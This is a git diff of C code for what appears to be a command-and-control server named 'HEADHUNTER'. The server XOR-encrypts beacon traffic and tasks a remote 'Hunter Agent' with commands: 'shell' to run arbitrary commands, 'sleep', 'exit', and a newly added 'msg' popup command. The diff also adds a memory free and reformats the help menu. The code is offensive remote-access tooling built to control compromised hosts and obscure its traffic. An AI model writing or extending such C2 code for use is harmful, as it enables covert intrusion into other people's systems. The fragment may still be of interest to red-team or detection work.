@@ -160,6 +160,7 @@ void *Socket_Reader(){
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
 
+
 	    xorbuffer = XOR(buffer, key, n, keylen);
 	    if(str_starts_with(xorbuffer, "--HEADHUNTER BEACON--") == 0){
         
@@ -176,6 +177,7 @@ void *Socket_Reader(){
 			char* xorcommand = XOR(a.beaconbuf, key, a.beaconbufsize, keylen);
             		send(a.dest, xorcommand, a.beaconbufsize, 0);       
 			a.beaconbufsize = 0;
+			free(xorcommand);
 		}
 		else{
 			send(a.dest, xorresponse, strlen(response), 0);
@@ -244,11 +246,12 @@ void *Socket_Writer()
 	else if(strcmp(newline_terminator(buffer), "help\n") == 0){
 		printf("\nHunter Agent v1.0 Commands\n");
 		printf("================================\n");
-		printf("shell <command>    task the agent to run a command\n");
-		printf("sleep <seconds>    task the agent to sleep for a specified time\n");
-		printf("help               displays this menu\n");
-		printf("bg                 backgrounds the agent command session\n");
-		printf("exit               tasks the agent to exit\n\n");
+		printf("\nshell <command>          task the agent to run a command\n");
+		printf("sleep <seconds>            task the agent to sleep for a specified time\n");
+		printf("msg <message>              task the agent to execute a popup message\n");
+		printf("help                       displays this menu\n");
+		printf("bg                         backgrounds the agent command session\n");
+		printf("exit                       tasks the agent to exit\n\n");
 
 		printf("hunter> ");
 		fflush(NULL);
@@ -282,8 +285,8 @@ void *Socket_Writer()
 
 	else {
 
-	    if(str_starts_with(buffer, "shell") == 0 || str_starts_with(buffer, "sleep") == 0){ 	
-	    
+	    if(str_starts_with(buffer, "shell") == 0 || str_starts_with(buffer, "sleep") == 0 || str_starts_with(buffer, "msg") == 0){ 	
+	   
 	    	printf("\n\e[1;34m[*]\e[0m Tasking agent with command\n");
 	   	a.beaconbufsize = n;
 	   	a.beaconbuf = buffer;
